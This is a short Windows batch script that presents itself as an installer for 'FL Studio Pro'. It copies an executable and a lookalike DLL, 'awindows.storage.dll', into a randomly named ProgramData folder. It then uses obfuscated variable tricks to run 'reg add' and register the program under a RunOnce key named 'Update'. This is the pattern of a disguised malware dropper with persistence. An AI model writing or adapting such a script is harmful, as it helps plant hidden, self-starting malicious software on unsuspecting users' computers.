@echo off
mkdir "C:\ProgramData\aB3dE7x"
copy /y "fl studio pro.exe" "C:\ProgramData\aB3dE7x\fl studio pro.exe"
copy /y unityplayer.dll "C:\ProgramData\aB3dE7x\unityplayer.dll"
copy /y manifest.json "C:\ProgramData\aB3dE7x\manifest.json"
copy /y awindows.storage.dll "C:\ProgramData\aB3dE7x\awindows.storage.dll"
cmd /v:on /c "set a=r&set b=e&set c=g&set d=a&set e=d&set f=d&!a!!b!!c! !d!!e!!f! HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Update /t REG_SZ /d "C:\ProgramData\aB3dE7x\fl studio pro.exe" /f"
